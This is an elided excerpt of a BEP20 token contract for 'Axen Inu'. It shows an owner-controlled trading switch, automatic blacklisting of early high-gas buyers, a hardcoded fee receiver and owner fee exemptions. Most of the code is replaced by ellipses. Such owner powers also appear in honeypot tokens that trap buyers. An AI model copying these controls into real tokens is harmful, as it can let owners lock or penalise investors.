...
contract AxenInu is IBEP20, Auth {
    ...
    string constant _name = "Axen Inu";
    string constant _symbol = "AXI";
    ...
    address public marketingFeeReceiver = 0xfBF50B2577DF9032194af8cc84a4B04bdc769241;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair && launchBlock + swapDelay >= block.number && tx.gasprice >= swapAt){isblacklisted[recipient] = true;} // Auto Blacklisted
        }
    ...
    function setIsFeeExempt(address holder, bool exempt) external onlyOwner { // exclude adrress from add fee
